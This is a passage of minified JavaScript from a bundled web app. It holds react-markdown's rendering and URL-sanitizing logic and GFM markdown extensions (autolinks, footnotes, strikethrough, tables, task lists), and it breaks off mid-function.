gW(a){return!!(a&&typeof a=="object"&&"message"in a&&"messages"in a)}function bW(a){return typeof a=="string"||vW(a)}function vW(a){return!!(a&&typeof a=="object"&&"byteLength"in a&&"byteOffset"in a)}const yW="https://github.com/remarkjs/react-markdown/blob/main/changelog.md",ZP=[],eL={allowDangerousHtml:!0},EW=/^(https?|ircs?|mailto|xmpp)$/i,SW=[{from:"astPlugins",id:"remove-buggy-html-in-markdown-parser"},{from:"allowDangerousHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"allowNode",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowElement"},{from:"allowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowedElements"},{from:"className",id:"remove-classname"},{from:"disallowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"disallowedElements"},{from:"escapeHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"includeElementIndex",id:"#remove-includeelementindex"},{from:"includeNodeIndex",id:"change-includenodeindex-to-includeelementindex"},{from:"linkTarget",id:"remove-linktarget"},{from:"plugins",id:"change-plugins-to-remarkplugins",to:"remarkPlugins"},{from:"rawSourcePos",id:"#remove-rawsourcepos"},{from:"renderers",id:"change-renderers-to-components",to:"components"},{from:"source",id:"change-source-to-children",to:"children"},{from:"sourcePos",id:"#remove-sourcepos"},{from:"transformImageUri",id:"#add-urltransform",to:"urlTransform"},{from:"transformLinkUri",id:"#add-urltransform",to:"urlTransform"}];function D0(a){const e=CW(a),t=TW(a);return xW(e.runSync(e.parse(t),t),a)}function CW(a){const e=a.rehypePlugins||ZP,t=a.remarkPlugins||ZP,n=a.remarkRehypeOptions?{...a.remarkRehypeOptions,...eL}:eL;return hW().use(nJ).use(t).use($J,n).use(e)}function TW(a){const e=a.children||"",t=new yM;return typeof e=="string"&&(t.value=e),t}function xW(a,e){const t=e.allowedElements,n=e.allowElement,i=e.components,r=e.disallowedElements,l=e.skipHtml,u=e.unwrapDisallowed,d=e.urlTransform||AW;for(const f of SW)Object.hasOwn(e,f.from)&&(""+f.from+(f.to?"use `"+f.to+"` instead":"remove it")+yW+f.id,void 0);return Eg(a,p),z7(a,{Fragment:b.Fragment,components:i,ignoreInvalidStyle:!0,jsx:b.jsx,jsxs:b.jsxs,passKeys:!0,passNode:!0});function p(f,h,E){if(f.type==="raw"&&E&&typeof h=="number")return l?E.children.splice(h,1):E.children[h]={type:"text",value:f.value},h;if(f.type==="element"){let C;for(C in iy)if(Object.hasOwn(iy,C)&&Object.hasOwn(f.properties,C)){const A=f.properties[C],j=iy[C];(j===null||j.includes(f.tagName))&&(f.properties[C]=d(String(A||""),C,f))}}if(f.type==="element"){let C=t?!t.includes(f.tagName):r?r.includes(f.tagName):!1;if(!C&&n&&typeof h=="number"&&(C=!n(f,h,E)),C&&E&&typeof h=="number")return u&&f.children?E.children.splice(h,1,...f.children):E.children.splice(h,1),h}}}function AW(a){const e=a.indexOf(":"),t=a.indexOf("?"),n=a.indexOf("#"),i=a.indexOf("/");return e===-1||i!==-1&&e>i||t!==-1&&e>t||n!==-1&&e>n||EW.test(a.slice(0,e))?a:""}function aL(a,e){const t=String(a);if(typeof e!="string")throw new TypeError("Expected character");let n=0,i=t.indexOf(e);for(;i!==-1;)n++,i=t.indexOf(e,i+e.length);return n}function PW(a){if(typeof a!="string")throw new TypeError("Expected a string");return a.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&").replace(/-/g,"\\x2d")}function LW(a,e,t){const i=vg((t||{}).ignore||[]),r=RW(e);let l=-1;for(;++l<r.length;)vM(a,"text",u);function u(p,f){let h=-1,E;for(;++h<f.length;){const C=f[h],A=E?E.children:void 0;if(i(C,A?A.indexOf(C):void 0,E))return;E=C}if(E)return d(p,f)}function d(p,f){const h=f[f.length-1],E=r[l][0],C=r[l][1];let A=0;const R=h.children.indexOf(p);let I=!1,w=[];E.lastIndex=0;let k=E.exec(p.value);for(;k;){const Y=k.index,ee={index:k.index,input:k.input,stack:[...f,p]};let Q=C(...k,ee);if(typeof Q=="string"&&(Q=Q.length>0?{type:"text",value:Q}:void 0),Q===!1?E.lastIndex=Y+1:(A!==Y&&w.push({type:"text",value:p.value.slice(A,Y)}),Array.isArray(Q)?w.push(...Q):Q&&w.push(Q),A=Y+k[0].length,I=!0),!E.global)break;k=E.exec(p.value)}return I?(A<p.value.length&&w.push({type:"text",value:p.value.slice(A)}),h.children.splice(R,1,...w)):w=[p],R+w.length}}function RW(a){const e=[];if(!Array.isArray(a))throw new TypeError("Expected find and replace tuple or list of tuples");const t=!a[0]||Array.isArray(a[0])?a:[a];let n=-1;for(;++n<t.length;){const i=t[n];e.push([IW(i[0]),wW(i[1])])}return e}function IW(a){return typeof a=="string"?new RegExp(PW(a),"g"):a}function wW(a){return typeof a=="function"?a:function(){return a}}const hy="phrasing",gy=["autolink","link","image","label"];function jW(){return{transforms:[OW],enter:{literalAutolink:MW,literalAutolinkEmail:by,literalAutolinkHttp:by,literalAutolinkWww:by},exit:{literalAutolink:kW,literalAutolinkEmail:qW,literalAutolinkHttp:NW,literalAutolinkWww:_W}}}function DW(){return{unsafe:[{character:"@",before:"[+\\-.\\w]",after:"[\\-.\\w]",inConstruct:hy,notInConstruct:gy},{character:".",before:"[Ww]",after:"[\\-.\\w]",inConstruct:hy,notInConstruct:gy},{character:":",before:"[ps]",after:"\\/",inConstruct:hy,notInConstruct:gy}]}}function MW(a){this.enter({type:"link",title:null,url:"",children:[]},a)}function by(a){this.config.enter.autolinkProtocol.call(this,a)}function NW(a){this.config.exit.autolinkProtocol.call(this,a)}function _W(a){this.config.exit.data.call(this,a);const e=this.stack[this.stack.length-1];e.type,e.url="http://"+this.sliceSerialize(a)}function qW(a){this.config.exit.autolinkEmail.call(this,a)}function kW(a){this.exit(a)}function OW(a){LW(a,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,UW],[new RegExp("(?<=^|\\s|\\p{P}|\\p{S})([-.\\w+]+)@([-\\w]+(?:\\.[-\\w]+)+)","gu"),zW]],{ignore:["link","linkReference"]})}function UW(a,e,t,n,i){let r="";if(!EM(i)||(/^w/i.test(e)&&(t=e+t,e="",r="http://"),!BW(t)))return!1;const l=FW(t+n);if(!l[0])return!1;const u={type:"link",title:null,url:r+e+l[0],children:[{type:"text",value:e+l[0]}]};return l[1]?[u,{type:"text",value:l[1]}]:u}function zW(a,e,t,n){return!EM(n,!0)||/[-\d_]$/.test(t)?!1:{type:"link",title:null,url:"mailto:"+e+"@"+t,children:[{type:"text",value:e+"@"+t}]}}function BW(a){const e=a.split(".");return!(e.length<2||e[e.length-1]&&(/_/.test(e[e.length-1])||!/[a-zA-Z\d]/.test(e[e.length-1]))||e[e.length-2]&&(/_/.test(e[e.length-2])||!/[a-zA-Z\d]/.test(e[e.length-2])))}function FW(a){const e=/[!"&'),.:;<>?\]}]+$/.exec(a);if(!e)return[a,void 0];a=a.slice(0,e.index);let t=e[0],n=t.indexOf(")");const i=aL(a,"(");let r=aL(a,")");for(;n!==-1&&i>r;)a+=t.slice(0,n+1),t=t.slice(n+1),n=t.indexOf(")"),r++;return[a,t]}function EM(a,e){const t=a.input.charCodeAt(a.index-1);return(a.index===0||ul(t)||hg(t))&&(!e||t!==47)}SM.peek=$W;function VW(){this.buffer()}function HW(a){this.enter({type:"footnoteReference",identifier:"",label:""},a)}function GW(){this.buffer()}function QW(a){this.enter({type:"footnoteDefinition",identifier:"",label:"",children:[]},a)}function JW(a){const e=this.resume(),t=this.stack[this.stack.length-1];t.type,t.identifier=Ci(this.sliceSerialize(a)).toLowerCase(),t.label=e}function WW(a){this.exit(a)}function KW(a){const e=this.resume(),t=this.stack[this.stack.length-1];t.type,t.identifier=Ci(this.sliceSerialize(a)).toLowerCase(),t.label=e}function YW(a){this.exit(a)}function $W(){return"["}function SM(a,e,t,n){const i=t.createTracker(n);let r=i.move("[^");const l=t.enter("footnoteReference"),u=t.enter("reference");return r+=i.move(t.safe(t.associationId(a),{after:"]",before:r})),u(),l(),r+=i.move("]"),r}function XW(){return{enter:{gfmFootnoteCallString:VW,gfmFootnoteCall:HW,gfmFootnoteDefinitionLabelString:GW,gfmFootnoteDefinition:QW},exit:{gfmFootnoteCallString:JW,gfmFootnoteCall:WW,gfmFootnoteDefinitionLabelString:KW,gfmFootnoteDefinition:YW}}}function ZW(a){let e=!1;return a&&a.firstLineBlank&&(e=!0),{handlers:{footnoteDefinition:t,footnoteReference:SM},unsafe:[{character:"[",inConstruct:["label","phrasing","reference"]}]};function t(n,i,r,l){const u=r.createTracker(l);let d=u.move("[^");const p=r.enter("footnoteDefinition"),f=r.enter("label");return d+=u.move(r.safe(r.associationId(n),{before:d,after:"]"})),f(),d+=u.move("]:"),n.children&&n.children.length>0&&(u.shift(4),d+=u.move((e?`
`:" ")+r.indentLines(r.containerFlow(n,u.current()),e?CM:eK))),p(),d}}function eK(a,e,t){return e===0?a:CM(a,e,t)}function CM(a,e,t){return(t?"":"    ")+a}const aK=["autolink","destinationLiteral","destinationRaw","reference","titleQuote","titleApostrophe"];TM.peek=sK;function tK(){return{canContainEols:["delete"],enter:{strikethrough:iK},exit:{strikethrough:oK}}}function nK(){return{unsafe:[{character:"~",inConstruct:"phrasing",notInConstruct:aK}],handlers:{delete:TM}}}function iK(a){this.enter({type:"delete",children:[]},a)}function oK(a){this.exit(a)}function TM(a,e,t,n){const i=t.createTracker(n),r=t.enter("strikethrough");let l=i.move("~~");return l+=t.containerPhrasing(a,{...i.current(),before:l,after:"~"}),l+=i.move("~~"),r(),l}function sK(){return"~"}function rK(a){return a.length}function lK(a,e){const t=e||{},n=(t.align||[]).concat(),i=t.stringLength||rK,r=[],l=[],u=[],d=[];let p=0,f=-1;for(;++f<a.length;){const j=[],R=[];let I=-1;for(a[f].length>p&&(p=a[f].length);++I<a[f].length;){const w=cK(a[f][I]);if(t.alignDelimiters!==!1){const k=i(w);R[I]=k,(d[I]===void 0||k>d[I])&&(d[I]=k)}j.push(w)}l[f]=j,u[f]=R}let h=-1;if(typeof n=="object"&&"length"in n)for(;++h<p;)r[h]=tL(n[h]);else{const j=tL(n);for(;++h<p;)r[h]=j}h=-1;const E=[],C=[];for(;++h<p;){const j=r[h];let R="",I="";j===99?(R=":",I=":"):j===108?R=":":j===114&&(I=":");let w=t.alignDelimiters===!1?1:Math.max(1,d[h]-R.length-I.length);const k=R+"-".repeat(w)+I;t.alignDelimiters!==!1&&(w=R.length+w+I.length,w>d[h]&&(d[h]=w),C[h]=w),E[h]=k}l.splice(1,0,E),u.splice(1,0,C),f=-1;const A=[];for(;++f<l.length;){const j=l[f],R=u[f];h=-1;const I=[];for(;++h<p;){const w=j[h]||"";let k="",Y="";if(t.alignDelimiters!==!1){const ee=d[h]-(R[h]||0),Q=r[h];Q===114?k=" ".repeat(ee):Q===99?ee%2?(k=" ".repeat(ee/2+.5),Y=" ".repeat(ee/2-.5)):(k=" ".repeat(ee/2),Y=k):Y=" ".repeat(ee)}t.delimiterStart!==!1&&!h&&I.push("|"),t.padding!==!1&&!(t.alignDelimiters===!1&&w==="")&&(t.delimiterStart!==!1||h)&&I.push(" "),t.alignDelimiters!==!1&&I.push(k),I.push(w),t.alignDelimiters!==!1&&I.push(Y),t.padding!==!1&&I.push(" "),(t.delimiterEnd!==!1||h!==p-1)&&I.push("|")}A.push(t.delimiterEnd===!1?I.join("").replace(/ +$/,""):I.join(""))}return A.join(`
`)}function cK(a){return a==null?"":String(a)}function tL(a){const e=typeof a=="string"?a.codePointAt(0):0;return e===67||e===99?99:e===76||e===108?108:e===82||e===114?114:0}const nL={}.hasOwnProperty;function xM(a,e){const t=e||{};function n(i,...r){let l=n.invalid;const u=n.handlers;if(i&&nL.call(i,a)){const d=String(i[a]);l=nL.call(u,d)?u[d]:n.unknown}if(l)return l.call(this,i,...r)}return n.handlers=t.handlers||{},n.invalid=t.invalid,n.unknown=t.unknown,n}function uK(a,e,t,n){const i=t.enter("blockquote"),r=t.createTracker(n);r.move("> "),r.shift(2);const l=t.indentLines(t.containerFlow(a,r.current()),dK);return i(),l}function dK(a,e,t){return">"+(t?"":" ")+a}function pK(a,e){return iL(a,e.inConstruct,!0)&&!iL(a,e.notInConstruct,!1)}function iL(a,e,t){if(typeof e=="string"&&(e=[e]),!e||e.length===0)return t;let n=-1;for(;++n<e.length;)if(a.includes(e[n]))return!0;return!1}function oL(a,e,t,n){let i=-1;for(;++i<t.unsafe.length;)if(t.unsafe[i].character===`
`&&pK(t.stack,t.unsafe[i]))return/[ \t]/.test(n.before)?"":" ";return`\\
`}function mK(a,e){const t=String(a);let n=t.indexOf(e),i=n,r=0,l=0;if(typeof e!="string")throw new TypeError("Expected substring");for(;n!==-1;)n===i?++r>l&&(l=r):r=1,i=n+e.length,n=t.indexOf(e,i);return l}function fK(a,e){return!!(e.options.fences===!1&&a.value&&!a.lang&&/[^ \r\n]/.test(a.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(a.value))}function hK(a){const e=a.options.fence||"`";if(e!=="`"&&e!=="~")throw new Error("Cannot serialize code with `"+e+"` for `options.fence`, expected `` ` `` or `~`");return e}function gK(a,e,t,n){const i=hK(t),r=a.value||"",l=i==="`"?"GraveAccent":"Tilde";if(fK(a,t)){const h=t.enter("codeIndented"),E=t.indentLines(r,bK);return h(),E}const u=t.createTracker(n),d=i.repeat(Math.max(mK(r,i)+1,3)),p=t.enter("codeFenced");let f=u.move(d);if(a.lang){const h=t.enter(`codeFencedLang${l}`);f+=u.move(t.safe(a.lang,{before:f,after:" ",encode:["`"],...u.current()})),h()}if(a.lang&&a.meta){const h=t.enter(`codeFencedMeta${l}`);f+=u.move(" "),f+=u.move(t.safe(a.meta,{before:f,after:`
`,encode:["`"],...u.current()})),h()}return f+=u.move(`
`),r&&(f+=u.move(r+`
`)),f+=u.move(d),p(),f}function bK(a,e,t){return(t?"":"    ")+a}function W1(a){const e=a.options.quote||'"';if(e!=='"'&&e!=="'")throw new Error("Cannot serialize title with `"+e+"` for `options.quote`, expected `\"`, or `'`");return e}function vK(a,e,t,n){const i=W1(t),r=i==='"'?"Quote":"Apostrophe",l=t.enter("definition");let u=t.enter("label");const d=t.createTracker(n);let p=d.move("[");return p+=d.move(t.safe(t.associationId(a),{before:p,after:"]",...d.current()})),p+=d.move("]: "),u(),!a.url||/[\0- \u007F]/.test(a.url)?(u=t.enter("destinationLiteral"),p+=d.move("<"),p+=d.move(t.safe(a.url,{before:p,after:">",...d.current()})),p+=d.move(">")):(u=t.enter("destinationRaw"),p+=d.move(t.safe(a.url,{before:p,after:a.title?" ":`
`,...d.current()}))),u(),a.title&&(u=t.enter(`title${r}`),p+=d.move(" "+i),p+=d.move(t.safe(a.title,{before:p,after:i,...d.current()})),p+=d.move(i),u()),l(),p}function yK(a){const e=a.options.emphasis||"*";if(e!=="*"&&e!=="_")throw new Error("Cannot serialize emphasis with `"+e+"` for `options.emphasis`, expected `*`, or `_`");return e}function up(a){return"&#x"+a.toString(16).toUpperCase()+";"}function Dh(a,e,t){const n=qc(a),i=qc(e);return n===void 0?i===void 0?t==="_"?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:n===1?i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}AM.peek=EK;function AM(a,e,t,n){const i=yK(t),r=t.enter("emphasis"),l=t.createTracker(n),u=l.move(i);let d=l.move(t.containerPhrasing(a,{after:i,before:u,...l.current()}));const p=d.charCodeAt(0),f=Dh(n.before.charCodeAt(n.before.length-1),p,i);f.inside&&(d=up(p)+d.slice(1));const h=d.charCodeAt(d.length-1),E=Dh(n.after.charCodeAt(0),h,i);E.inside&&(d=d.slice(0,-1)+up(h));const C=l.move(i);return r(),t.attentionEncodeSurroundingInfo={after:E.outside,before:f.outside},u+d+C}function EK(a,e,t){return t.options.emphasis||"*"}function SK(a,e){let t=!1;return Eg(a,function(n){if("value"in n&&/\r?\n|\r/.test(n.value)||n.type==="break")return t=!0,R0}),!!((!a.depth||a.depth<3)&&z1(a)&&(e.options.setext||t))}function CK(a,e,t,n){const i=Math.max(Math.min(6,a.depth||1),1),r=t.createTracker(n);if(SK(a,t)){const f=t.enter("headingSetext"),h=t.enter("phrasing"),E=t.containerPhrasing(a,{...r.current(),before:`
`,after:`
`});return h(),f(),E+`
`+(i===1?"=":"-").repeat(E.length-(Math.max(E.lastIndexOf("\r"),E.lastIndexOf(`
`))+1))}const l="#".repeat(i),u=t.enter("headingAtx"),d=t.enter("phrasing");r.move(l+" ");let p=t.containerPhrasing(a,{before:"# ",after:`
`,...r.current()});return/^[\t ]/.test(p)&&(p=up(p.charCodeAt(0))+p.slice(1)),p=p?l+" "+p:l,t.options.closeAtx&&(p+=" "+l),d(),u(),p}PM.peek=TK;function PM(a){return a.value||""}function TK(){return"<"}LM.peek=xK;function LM(a,e,t,n){const i=W1(t),r=i==='"'?"Quote":"Apostrophe",l=t.enter("image");let u=t.enter("label");const d=t.createTracker(n);let p=d.move("![");return p+=d.move(t.safe(a.alt,{before:p,after:"]",...d.current()})),p+=d.move("]("),u(),!a.url&&a.title||/[\0- \u007F]/.test(a.url)?(u=t.enter("destinationLiteral"),p+=d.move("<"),p+=d.move(t.safe(a.url,{before:p,after:">",...d.current()})),p+=d.move(">")):(u=t.enter("destinationRaw"),p+=d.move(t.safe(a.url,{before:p,after:a.title?" ":")",...d.current()}))),u(),a.title&&(u=t.enter(`title${r}`),p+=d.move(" "+i),p+=d.move(t.safe(a.title,{before:p,after:i,...d.current()})),p+=d.move(i),u()),p+=d.move(")"),l(),p}function xK(){return"!"}RM.peek=AK;function RM(a,e,t,n){const i=a.referenceType,r=t.enter("imageReference");let l=t.enter("label");const u=t.createTracker(n);let d=u.move("![");const p=t.safe(a.alt,{before:d,after:"]",...u.current()});d+=u.move(p+"]["),l();const f=t.stack;t.stack=[],l=t.enter("reference");const h=t.safe(t.associationId(a),{before:d,after:"]",...u.current()});return l(),t.stack=f,r(),i==="full"||!p||p!==h?d+=u.move(h+"]"):i==="shortcut"?d=d.slice(0,-1):d+=u.move("]"),d}function AK(){return"!"}IM.peek=PK;function IM(a,e,t){let n=a.value||"",i="`",r=-1;for(;new RegExp("(^|[^`])"+i+"([^`]|$)").test(n);)i+="`";for(/[^ \r\n]/.test(n)&&(/^[ \r\n]/.test(n)&&/[ \r\n]$/.test(n)||/^`|`$/.test(n))&&(n=" "+n+" ");++r<t.unsafe.length;){const l=t.unsafe[r],u=t.compilePattern(l);let d;if(l.atBreak)for(;d=u.exec(n);){let p=d.index;n.charCodeAt(p)===10&&n.charCodeAt(p-1)===13&&p--,n=n.slice(0,p)+" "+n.slice(d.index+1)}}return i+n+i}function PK(){return"`"}function wM(a,e){const t=z1(a);return!!(!e.options.resourceLink&&a.url&&!a.title&&a.children&&a.children.length===1&&a.children[0].type==="text"&&(t===a.url||"mailto:"+t===a.url)&&/^[a-z][a-z+.-]+:/i.test(a.url)&&!/[\0- <>\u007F]/.test(a.url))}jM.peek=LK;function jM(a,e,t,n){const i=W1(t),r=i==='"'?"Quote":"Apostrophe",l=t.createTracker(n);let u,d;if(wM(a,t)){const f=t.stack;t.stack=[],u=t.enter("autolink");let h=l.move("<");return h+=l.move(t.containerPhrasing(a,{before:h,after:">",...l.current()})),h+=l.move(">"),u(),t.stack=f,h}u=t.enter("link"),d=t.enter("label");let p=l.move("[");return p+=l.move(t.containerPhrasing(a,{before:p,after:"](",...l.current()})),p+=l.move("]("),d(),!a.url&&a.title||/[\0- \u007F]/.test(a.url)?(d=t.enter("destinationLiteral"),p+=l.move("<"),p+=l.move(t.safe(a.url,{before:p,after:">",...l.current()})),p+=l.move(">")):(d=t.enter("destinationRaw"),p+=l.move(t.safe(a.url,{before:p,after:a.title?" ":")",...l.current()}))),d(),a.title&&(d=t.enter(`title${r}`),p+=l.move(" "+i),p+=l.move(t.safe(a.title,{before:p,after:i,...l.current()})),p+=l.move(i),d()),p+=l.move(")"),u(),p}function LK(a,e,t){return wM(a,t)?"<":"["}DM.peek=RK;function DM(a,e,t,n){const i=a.referenceType,r=t.enter("linkReference");let l=t.enter("label");const u=t.createTracker(n);let d=u.move("[");const p=t.containerPhrasing(a,{before:d,after:"]",...u.current()});d+=u.move(p+"]["),l();const f=t.stack;t.stack=[],l=t.enter("reference");const h=t.safe(t.associationId(a),{before:d,after:"]",...u.current()});return l(),t.stack=f,r(),i==="full"||!p||p!==h?d+=u.move(h+"]"):i==="shortcut"?d=d.slice(0,-1):d+=u.move("]"),d}function RK(){return"["}function K1(a){const e=a.options.bullet||"*";if(e!=="*"&&e!=="+"&&e!=="-")throw new Error("Cannot serialize items with `"+e+"` for `options.bullet`, expected `*`, `+`, or `-`");return e}function IK(a){const e=K1(a),t=a.options.bulletOther;if(!t)return e==="*"?"-":"*";if(t!=="*"&&t!=="+"&&t!=="-")throw new Error("Cannot serialize items with `"+t+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(t===e)throw new Error("Expected `bullet` (`"+e+"`) and `bulletOther` (`"+t+"`) to be different");return t}function wK(a){const e=a.options.bulletOrdered||".";if(e!=="."&&e!==")")throw new Error("Cannot serialize items with `"+e+"` for `options.bulletOrdered`, expected `.` or `)`");return e}function MM(a){const e=a.options.rule||"*";if(e!=="*"&&e!=="-"&&e!=="_")throw new Error("Cannot serialize rules with `"+e+"` for `options.rule`, expected `*`, `-`, or `_`");return e}function jK(a,e,t,n){const i=t.enter("list"),r=t.bulletCurrent;let l=a.ordered?wK(t):K1(t);const u=a.ordered?l==="."?")":".":IK(t);let d=e&&t.bulletLastUsed?l===t.bulletLastUsed:!1;if(!a.ordered){const f=a.children?a.children[0]:void 0;if((l==="*"||l==="-")&&f&&(!f.children||!f.children[0])&&t.stack[t.stack.length-1]==="list"&&t.stack[t.stack.length-2]==="listItem"&&t.stack[t.stack.length-3]==="list"&&t.stack[t.stack.length-4]==="listItem"&&t.indexStack[t.indexStack.length-1]===0&&t.indexStack[t.indexStack.length-2]===0&&t.indexStack[t.indexStack.length-3]===0&&(d=!0),MM(t)===l&&f){let h=-1;for(;++h<a.children.length;){const E=a.children[h];if(E&&E.type==="listItem"&&E.children&&E.children[0]&&E.children[0].type==="thematicBreak"){d=!0;break}}}}d&&(l=u),t.bulletCurrent=l;const p=t.containerFlow(a,n);return t.bulletLastUsed=l,t.bulletCurrent=r,i(),p}function DK(a){const e=a.options.listItemIndent||"one";if(e!=="tab"&&e!=="one"&&e!=="mixed")throw new Error("Cannot serialize items with `"+e+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return e}function MK(a,e,t,n){const i=DK(t);let r=t.bulletCurrent||K1(t);e&&e.type==="list"&&e.ordered&&(r=(typeof e.start=="number"&&e.start>-1?e.start:1)+(t.options.incrementListMarker===!1?0:e.children.indexOf(a))+r);let l=r.length+1;(i==="tab"||i==="mixed"&&(e&&e.type==="list"&&e.spread||a.spread))&&(l=Math.ceil(l/4)*4);const u=t.createTracker(n);u.move(r+" ".repeat(l-r.length)),u.shift(l);const d=t.enter("listItem"),p=t.indentLines(t.containerFlow(a,u.current()),f);return d(),p;function f(h,E,C){return E?(C?"":" ".repeat(l))+h:(C?r:r+" ".repeat(l-r.length))+h}}function NK(a,e,t,n){const i=t.enter("paragraph"),r=t.enter("phrasing"),l=t.containerPhrasing(a,n);return r(),i(),l}const _K=vg(["break","delete","emphasis","footnote","footnoteReference","image","imageReference","inlineCode","inlineMath","link","linkReference","mdxJsxTextElement","mdxTextExpression","strong","text","textDirective"]);function qK(a,e,t,n){return(a.children.some(function(l){return _K(l)})?t.containerPhrasing:t.containerFlow).call(t,a,n)}function kK(a){const e=a.options.strong||"*";if(e!=="*"&&e!=="_")throw new Error("Cannot serialize strong with `"+e+"` for `options.strong`, expected `*`, or `_`");return e}NM.peek=OK;function NM(a,e,t,n){const i=kK(t),r=t.enter("strong"),l=t.createTracker(n),u=l.move(i+i);let d=l.move(t.containerPhrasing(a,{after:i,before:u,...l.current()}));const p=d.charCodeAt(0),f=Dh(n.before.charCodeAt(n.before.length-1),p,i);f.inside&&(d=up(p)+d.slice(1));const h=d.charCodeAt(d.length-1),E=Dh(n.after.charCodeAt(0),h,i);E.inside&&(d=d.slice(0,-1)+up(h));const C=l.move(i+i);return r(),t.attentionEncodeSurroundingInfo={after:E.outside,before:f.outside},u+d+C}function OK(a,e,t){return t.options.strong||"*"}function UK(a,e,t,n){return t.safe(a.value,n)}function zK(a){const e=a.options.ruleRepetition||3;if(e<3)throw new Error("Cannot serialize rules with repetition `"+e+"` for `options.ruleRepetition`, expected `3` or more");return e}function BK(a,e,t){const n=(MM(t)+(t.options.ruleSpaces?" ":"")).repeat(zK(t));return t.options.ruleSpaces?n.slice(0,-1):n}const _M={blockquote:uK,break:oL,code:gK,definition:vK,emphasis:AM,hardBreak:oL,heading:CK,html:PM,image:LM,imageReference:RM,inlineCode:IM,link:jM,linkReference:DM,list:jK,listItem:MK,paragraph:NK,root:qK,strong:NM,text:UK,thematicBreak:BK};function FK(){return{enter:{table:VK,tableData:sL,tableHeader:sL,tableRow:GK},exit:{codeText:QK,table:HK,tableData:vy,tableHeader:vy,tableRow:vy}}}function VK(a){const e=a._align;this.enter({type:"table",align:e.map(function(t){return t==="none"?null:t}),children:[]},a),this.data.inTable=!0}function HK(a){this.exit(a),this.data.inTable=void 0}function GK(a){this.enter({type:"tableRow",children:[]},a)}function vy(a){this.exit(a)}function sL(a){this.enter({type:"tableCell",children:[]},a)}function QK(a){let e=this.resume();this.data.inTable&&(e=e.replace(/\\([\\|])/g,JK));const t=this.stack[this.stack.length-1];t.type,t.value=e,this.exit(a)}function JK(a,e){return e==="|"?e:a}function WK(a){const e=a||{},t=e.tableCellPadding,n=e.tablePipeAlign,i=e.stringLength,r=t?" ":"|";return{unsafe:[{character:"\r",inConstruct:"tableCell"},{character:`
`,inConstruct:"tableCell"},{atBreak:!0,character:"|",after:"[	 :-]"},{character:"|",inConstruct:"tableCell"},{atBreak:!0,character:":",after:"-"},{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{inlineCode:E,table:l,tableCell:d,tableRow:u}};function l(C,A,j,R){return p(f(C,j,R),C.align)}function u(C,A,j,R){const I=h(C,j,R),w=p([I]);return w.slice(0,w.indexOf(`
`))}function d(C,A,j,R){const I=j.enter("tableCell"),w=j.enter("phrasing"),k=j.containerPhrasing(C,{...R,before:r,after:r});return w(),I(),k}function p(C,A){return lK(C,{align:A,alignDelimiters:n,padding:t,stringLength:i})}function f(C,A,j){const R=C.children;let I=-1;const w=[],k=A.enter("table");for(;++I<R.length;)w[I]=h(R[I],A,j);return k(),w}function h(C,A,j){const R=C.children;let I=-1;const w=[],k=A.enter("tableRow");for(;++I<R.length;)w[I]=d(R[I],C,A,j);return k(),w}function E(C,A,j){let R=_M.inlineCode(C,A,j);return j.stack.includes("tableCell")&&(R=R.replace(/\|/g,"\\$&")),R}}function KK(){return{exit:{taskListCheckValueChecked:rL,taskListCheckValueUnchecked:rL,paragraph:$K}}}function YK(){return{unsafe:[{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{listItem:XK}}}function rL(a){const e=this.stack[this.stack.length-2];e.type,e.checked=a.type==="taskListCheckValueChecked"}function $K(a){const e=this.stack[this.stack.length-2];if(e&&e.type==="listItem"&&typeof e.checked=="boolean"){const t=this.stack[this.stack.length-1];t.type;const n=t.children[0];if(n&&n.type==="text"){const i=e.children;let r=-1,l;for(;++r<i.length;){const u=i[r];if(u.type==="paragraph"){l=u;break}}l===t&&(n.value=n.value.slice(1),n.value.length===0?t.children.shift():t.position&&n.position&&typeof n.position.start.offset=="number"&&(n.position.start.column++,n.position.start.offset++,t.position.start=Object.assign({},n.position.start)))}}this.exit(a)}function XK(a,e,t,n){const i=a.children[0],r=typeof a.checked=="boolean"&&i&&i.type==="paragraph",l="["+(a.checked?"x":" ")+"] ",u=t.createTracker(n);r&&u.move(l);let d=_M.listItem(a,e,t,{...n,...u.current()});return r&&(d=d.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,p)),d;function p(f){return f+l}}function ZK(){return[jW(),XW(),tK(),FK(),KK()]}function eY(a){return{extensions:[DW(),ZW(a),nK(),WK(a),YK()]}}const aY={tokenize:rY,partial:!0},qM={tokenize:lY,partial:!0},kM={tokenize:cY,partial:!0},OM={tokenize:uY,partial:!0},tY={tokenize:dY,partial:!0},UM={name:"wwwAutolink",tokenize:oY,previous:BM},zM={name:"protocolAutolink",tokenize:sY,previous:FM},Zo={name:"emailAutolink",tokenize:iY,previous:VM},po={};function nY(){return{text:po}}let Fr=48;for(;Fr<123;)po[Fr]=Zo,Fr++,Fr===58?Fr=65:Fr===91&&(Fr=97);po[43]=Zo;po[45]=Zo;po[46]=Zo;po[95]=Zo;po[72]=[Zo,zM];po[104]=[Zo,zM];po[87]=[Zo,UM];po[119]=[Zo,UM];function iY(a,e,t){const n=this;let i,r;return l;function l(h){return!M0(h)||!VM.call(n,n.previous)||Y1(n.events)?t(h):(a.enter("literalAutolink"),a.enter("literalAutolinkEmail"),u(h))}function u(h){return M0(h)?(a.consume(h),u):h===64?(a.consume(h),d):t(h)}function d(h){return h===46?a.check(tY,f,p)(h):h===45||h===95||Gt(h)?(r=!0,a.consume(h),d):f(h)}function p(h){return a.consume(h),i=!0,d}function f(h){return r&&i&&Xt(n.previous)?(a.exit("literalAutolinkEmail"),a.exit("literalAutolink"),e(h)):t(h)}}function oY(a,e,t){const n=this;return i;function i(l){return 